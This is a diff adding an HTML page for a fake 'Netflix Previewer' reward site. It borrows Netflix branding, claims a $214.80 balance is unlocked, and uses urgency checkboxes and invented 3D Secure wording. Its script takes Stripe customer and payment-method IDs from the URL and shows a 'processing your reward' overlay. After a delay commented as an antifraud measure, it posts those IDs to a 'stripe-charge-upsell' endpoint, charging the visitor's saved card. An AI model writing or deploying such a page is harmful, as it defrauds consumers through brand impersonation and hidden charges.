@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="/sp/upsell-gate.js"></script>
+  <!-- Redirecionador UTM desativado temporariamente -->
+  <script src="/sp/meta-pixel.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Netflix Previewer - Access Confirmed</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='4' fill='%23141414'/%3E%3Cpath fill='%23E50914' d='M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z'/%3E%3C/svg%3E">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: radial-gradient(ellipse at 50% -10%, #2b0508 0%, #141414 40%, #0a0a0a 75%);
+      color: #fff;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh; min-height: 100dvh;
+      display: flex; align-items: center; justify-content: center;
+      padding: 24px 18px;
+      position: relative; overflow-x: hidden;
+    }
+    body::before {
+      content: ''; position: fixed; top: -140px; left: 50%; transform: translateX(-50%);
+      width: 560px; height: 340px;
+      background: radial-gradient(ellipse, rgba(229, 9, 20, 0.20) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .card {
+      width: 100%; max-width: 420px;
+      background: #141414;
+      border: 1px solid rgba(229, 9, 20, 0.22);
+      border-radius: 22px;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(229, 9, 20, 0.08);
+      padding: 34px 24px 26px;
+      text-align: center;
+      position: relative; z-index: 1;
+    }
+    .brand {
+      display: inline-flex; align-items: center; gap: 8px;
+      font-size: 18px; font-weight: 800; letter-spacing: -0.5px; color: #fff;
+    }
+    .brand svg { width: 22px; height: 22px; fill: #E50914; }
+    .brand small {
+      font-size: 10px; font-weight: 600; color: #8a8a8e; text-transform: uppercase;
+      letter-spacing: 1px; border-left: 1px solid rgba(255, 255, 255, 0.18);
+      padding-left: 8px; margin-left: 4px;
+    }
+    .check {
+      width: 78px; height: 78px; margin: 26px auto 18px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 25%, #ff2b35, #E50914 60%, #b20710);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 10px 30px rgba(229, 9, 20, 0.45), 0 0 0 10px rgba(229, 9, 20, 0.10);
+      animation: pop 0.5s cubic-bezier(.2,1.4,.5,1) both;
+    }
+    @keyframes pop { 0% { transform: scale(0.6); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+    .check svg { width: 38px; height: 38px; stroke: #ffffff; stroke-width: 3.2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
+    h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.6px; }
+    .sub { font-size: 14px; line-height: 1.55; color: #b9b9bf; margin-top: 10px; }
+    .sub strong { color: #fff; font-weight: 700; }
+    .row {
+      display: flex; align-items: center; justify-content: space-between;
+      background: #1b1b1b; border: 1px solid #282828; border-radius: 14px;
+      padding: 13px 15px; margin-top: 20px; font-size: 13px; text-align: left;
+    }
+    .row span { color: #8a8a8e; }
+    .row b { color: #E50914; font-weight: 800; letter-spacing: -0.2px; }
+    .tasks { margin-top: 20px; text-align: left; }
+    .tasks-title { font-size: 12px; font-weight: 700; color: #b9b9bf; text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px; }
+    .task {
+      display: flex; align-items: flex-start; gap: 11px;
+      background: #1b1b1b; border: 1px solid #282828; border-radius: 14px;
+      padding: 12px 14px; margin-top: 8px; cursor: pointer;
+      transition: border-color 0.2s ease, background 0.2s ease;
+      user-select: none; -webkit-user-select: none;
+    }
+    .task:hover { border-color: rgba(229, 9, 20, 0.35); }
+    .task.done { border-color: rgba(229, 9, 20, 0.55); background: rgba(229, 9, 20, 0.07); }
+    .task-check { position: absolute; opacity: 0; pointer-events: none; }
+    .task-box {
+      flex: 0 0 auto; width: 22px; height: 22px; margin-top: 1px;
+      border: 2px solid #3a3a3e; border-radius: 7px;
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.18s ease;
+    }
+    .task-box svg { width: 13px; height: 13px; stroke: #ffffff; stroke-width: 3.4; fill: none; stroke-linecap: round; stroke-linejoin: round; opacity: 0; transform: scale(0.5); transition: all 0.18s ease; }
+    .task-check:checked + .task-box { background: linear-gradient(135deg, #f40612, #E50914); border-color: #E50914; box-shadow: 0 0 12px rgba(229, 9, 20, 0.45); }
+    .task-check:checked + .task-box svg { opacity: 1; transform: scale(1); }
+    .task-text { font-size: 13px; line-height: 1.45; color: #d7d7db; font-weight: 500; }
+    .task.done .task-text { color: #fff; }
+    .access-btn {
+      display: block; width: 100%; margin-top: 22px;
+      background: linear-gradient(135deg, #E50914, #b20710);
+      color: #ffffff; font-family: 'Inter', sans-serif;
+      font-size: 15px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.6px;
+      padding: 17px 0; border: none; border-radius: 500px; cursor: pointer;
+      box-shadow: 0 8px 26px rgba(229, 9, 20, 0.45);
+      animation: pulseBtn 2s ease-in-out infinite;
+      transition: transform 0.15s ease;
+    }
+    .access-btn:active { transform: scale(0.98); }
+    .access-btn:disabled { opacity: 0.45; cursor: not-allowed; animation: none; box-shadow: none; filter: grayscale(0.35); }
+    @keyframes spinOverlay { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes pulseBtn {
+      0%, 100% { box-shadow: 0 8px 26px rgba(229, 9, 20, 0.45); }
+      50% { box-shadow: 0 8px 38px rgba(229, 9, 20, 0.75); }
+    }
+    .err {
+      display: none; margin-top: 12px;
+      color: #f15e6c; font-size: 13px; font-weight: 500; line-height: 1.45;
+    }
+    .note { font-size: 11px; color: #6f6f75; margin-top: 14px; line-height: 1.5; }
+    .security-box {
+      margin-top: 18px;
+      padding: 20px 18px 18px;
+      text-align: center;
+      background:
+        radial-gradient(120% 100% at 50% 0%, rgba(229, 9, 20, 0.14), transparent 62%),
+        linear-gradient(180deg, #240709, #140406);
+      border: 1px solid rgba(229, 9, 20, 0.30);
+      border-radius: 16px;
+      box-shadow: 0 14px 32px -20px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255, 255, 255, 0.04);
+    }
+    .security-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 38px;
+      height: 38px;
+      margin-bottom: 10px;
+      border-radius: 50%;
+      background: rgba(229, 9, 20, 0.14);
+      border: 1px solid rgba(229, 9, 20, 0.35);
+    }
+    .security-badge svg { width: 19px; height: 19px; fill: #E50914; }
+    .security-title {
+      color: #ff4d56;
+      font-size: 11.5px;
+      font-weight: 800;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      margin: 0 0 8px;
+    }
+    .security-text {
+      color: #d7dce1;
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin: 0 auto 13px;
+      max-width: 34ch;
+    }
+    .security-text strong { color: #fff; font-weight: 700; }
+    .security-warn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin: 0;
+      padding: 7px 12px;
+      border-radius: 999px;
+      background: rgba(240, 185, 11, 0.1);
+      border: 1px solid rgba(240, 185, 11, 0.25);
+      color: #f0b90b;
+      font-size: 12px;
+      font-weight: 600;
+      line-height: 1.4;
+    }
+    .security-warn svg { width: 12px; height: 12px; fill: #f0b90b; flex-shrink: 0; }
+    .secure {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 11px; color: #8a8a8e; margin-top: 16px;
+    }
+    .secure svg { width: 12px; height: 12px; fill: #E50914; }
+  </style>
+
+</head>
+<body>
+  <!-- LOADING OVERLAY -->
+  <div id="loadingOverlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at 50% 0%, #2b0508 0%, #141414 40%, #0a0a0a 75%); z-index:999999; display:none; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:24px; box-sizing:border-box;">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:52px;height:52px;fill:#E50914;filter:drop-shadow(0 4px 18px rgba(229,9,20,0.45));margin-bottom:22px;"><path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z" /></svg>
+    <div style="width:52px; height:52px; border:4px solid rgba(229,9,20,0.18); border-top:4px solid #E50914; border-radius:50%; animation: spinOverlay 0.8s linear infinite; box-shadow:0 0 24px rgba(229,9,20,0.25);"></div>
+    <h3 id="overlayTitle" style="font-family:'Inter', sans-serif; font-size:22px; color:#ffffff; margin-top:22px; font-weight:800; letter-spacing:-0.3px;">Please wait...</h3>
+    <p id="overlaySub" style="font-size:14px; color:#b3b3b3; margin-top:8px; font-family:'Inter', sans-serif; font-weight:500;">Processing your reward. Stay on this page until it finishes.</p>
+    <div style="width:260px; max-width:80%; margin-top:14px;">
+      <p id="overlayCount" style="font-size:12px; color:#E50914; font-family:'Inter', sans-serif; font-weight:700; margin-bottom:8px;">Processing...</p>
+      <div style="width:100%; height:8px; background:rgba(229,9,20,0.15); border:1px solid rgba(229,9,20,0.3); border-radius:999px; overflow:hidden;">
+        <div id="overlayBar" style="width:0%; height:100%; background:linear-gradient(90deg, #E50914, #f40612); border-radius:999px; transition:width 0.25s linear; box-shadow:0 0 12px rgba(229,9,20,0.6);"></div>
+      </div>
+    </div>
+    <p style="font-size:13px; color:#f15e6c; margin-top:20px; font-family:'Inter', sans-serif; font-weight:800; line-height:1.5; max-width:300px; background:rgba(241,94,108,0.08); border:1px solid rgba(241,94,108,0.25); border-radius:12px; padding:12px 16px;">Do NOT close, refresh, or leave this page.<br />If you leave now, your reward will be lost.</p>
+  </div>
+
+  <div class="card" data-funnel-view="upsell_2">
+    <div class="brand">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z" /></svg>
+      Netflix<small>Previewer</small>
+    </div>
+
+    <div class="check">
+      <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+    </div>
+
+    <h1>Access confirmed!</h1>
+    <p class="sub"><strong>Thank you</strong> — your reward has been secured and your balance is now unlocked. Access your application to withdraw it.</p>
+
+    <div class="row"><span>Status</span><b>CONFIRMED</b></div>
+    <div class="row"><span>Reward access</span><b>UNLOCKED</b></div>
+
+    <div class="tasks">
+      <p class="tasks-title">Complete the steps below to unlock access:</p>
+      <label class="task">
+        <input type="checkbox" class="task-check">
+        <span class="task-box">
+          <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+        </span>
+        <span class="task-text">I confirm this is my account and I want to receive my reward</span>
+      </label>
+      <label class="task">
+        <input type="checkbox" class="task-check">
+        <span class="task-box">
+          <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+        </span>
+        <span class="task-text">I understand my balance expires if I don't access it today</span>
+      </label>
+      <label class="task">
+        <input type="checkbox" class="task-check">
+        <span class="task-box">
+          <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+        </span>
+        <span class="task-text">I agree to keep the app installed for 7 days to keep the reward</span>
+      </label>
+    </div>
+
+    <button id="accessBtn" class="access-btn" type="button" data-funnel-step="upsell_2" disabled>Access now</button>
+    <div id="accessErr" class="err"></div>
+
+    <div class="security-box">
+      <span class="security-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 14.5l-4-4 1.4-1.4 2.6 2.6 5.6-5.6L17 8.5l-6 7z" /></svg>
+      </span>
+      <p class="security-title">Security Verification (3D Secure)</p>
+      <p class="security-text">To activate your <strong>Priority Cashout License</strong> and release your <strong>$214.80</strong> pending balance <strong>immediately</strong>, your provider may request a quick 1-tap confirmation.</p>
+      <p class="security-warn">
+        <svg viewBox="0 0 24 24"><path d="M13 2L4.5 13.5H11l-1 8.5 8.5-11.5H12l1-8.5z" /></svg>
+        Keep this page open to approve your verification without interruption.
+      </p>
+    </div>
+
+    <p class="note">You will be redirected to your Netflix Previewer dashboard. Do not close this page.</p>
+
+    <div class="secure">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 14.5l-4-4 1.4-1.4 2.6 2.6 5.6-5.6L17 8.5l-6 7z" /></svg>
+      Secure 256-bit encrypted checkout
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var REDIRECT_URL = 'https://morganstudio.store/app/';
+      var WORKER_URL = 'https://checkout.morganstudio.store/api/stripe-charge-upsell';
+      var btn = document.getElementById('accessBtn');
+      var err = document.getElementById('accessErr');
+
+      function urlParams() {
+        var p = {};
+        try { new URLSearchParams((window.spTrackingSearch || location.search)).forEach(function (v, k) { p[k] = v; }); } catch (e) {}
+        try {
+          var raw = localStorage.getItem('funnel_params');
+          if (raw) {
+            var parsed = JSON.parse(raw);
+            var stored = (parsed && parsed.p) || {};
+            for (var k in stored) { if (p[k] == null || p[k] === '') p[k] = stored[k]; }
+          }
+        } catch (e) {}
+        return p;
+      }
+
+      // Checklist gate: button only unlocks when every item is checked.
+      var checks = Array.prototype.slice.call(document.querySelectorAll('.task-check'));
+      function refreshGate() {
+        var all = checks.every(function (c) { return c.checked; });
+        btn.disabled = !all;
+        btn.textContent = all ? 'Access now' : 'Complete the steps above';
+        checks.forEach(function (c) {
+          var label = c.closest('.task');
+          if (label) label.classList.toggle('done', c.checked);
+        });
+      }
+      checks.forEach(function (c) { c.addEventListener('change', refreshGate); });
+      refreshGate();
+
+      var params = urlParams();
+      var cid = params.cid || '';
+      var pm = params.pm || '';
+      var email = params.e || params.email || params.payerEmail || '';
+
+      function go() {
+        var q = (window.spTrackingSearch || window.location.search) || '';
+        window.top.location.href = REDIRECT_URL + (q ? (REDIRECT_URL.indexOf('?') > -1 ? '&' : '?') + q.slice(1) : '');
+      }
+
+      function showError(msg) {
+        err.textContent = msg;
+        err.style.display = 'block';
+        btn.disabled = false;
+        btn.textContent = 'Access now';
+      }
+
+      if (!cid || !pm) {
+        // No payment data in the URL: the button just forwards to the dashboard.
+        btn.addEventListener('click', go);
+        return;
+      }
+
+      // Single source of truth: loading screen and charge share this delay.
+      var UPSELL_DELAY_MS = 20000;
+      var UPSELL_REDIRECT_AT_MS = UPSELL_DELAY_MS - 1000;
+
+      btn.addEventListener('click', function () {
+        btn.disabled = true;
+        btn.textContent = 'Processing...';
+        err.style.display = 'none';
+
+        var overlay = document.getElementById('loadingOverlay');
+        var overlayTitle = document.getElementById('overlayTitle');
+        var overlaySub = document.getElementById('overlaySub');
+        var overlayCount = document.getElementById('overlayCount');
+        var startTs = Date.now();
+        overlayTitle.textContent = 'Please wait...';
+        overlaySub.textContent = 'Processing your reward. Stay on this page until it finishes.';
+        overlayCount.textContent = 'Processing... do not leave this page';
+        overlay.style.display = 'flex';
+        var overlayBar = document.getElementById('overlayBar');
+        var tick = setInterval(function () {
+          var pct = Math.min(100, ((Date.now() - startTs) / UPSELL_DELAY_MS) * 100);
+          if (overlayBar) overlayBar.style.width = pct + '%';
+          if (pct >= 100) clearInterval(tick);
+        }, 250);
+        setTimeout(function () {
+          clearInterval(tick);
+          if (overlayBar) overlayBar.style.width = '100%';
+          overlayTitle.textContent = 'Redirecting you...';
+          overlaySub.textContent = 'Almost there — do not close or refresh this page.';
+          overlayCount.textContent = 'Finalizing your reward...';
+        }, UPSELL_REDIRECT_AT_MS);
+
+        var urlParams = new URLSearchParams((window.spTrackingSearch || window.location.search));
+        // ANTIFRAUD DELAY: waits UPSELL_DELAY_MS before sending to Stripe
+        setTimeout(function () {
+          fetch(WORKER_URL + (window.spTrackingSearch || window.location.search), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              customer_id: cid,
+              payment_method_id: pm,
+              upsell_number: 2,
+              email: email,
+              extra_params: Object.fromEntries(urlParams.entries())
+            })
+          })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+              if (data && data.ok) {
+                clearInterval(tick);
+                setTimeout(go, 350);
+              } else {
+                clearInterval(tick);
+                overlay.style.display = 'none';
+                showError((data && data.error) || 'Access could not be confirmed. Please try again.');
+              }
+            })
+            .catch(function () {
+              clearInterval(tick);
+              overlay.style.display = 'none';
+              showError('Connection failed. Check your internet and try again.');
+            });
+        }, UPSELL_DELAY_MS);
+      });
+    })();
+  </script>
+</body>
+</html>
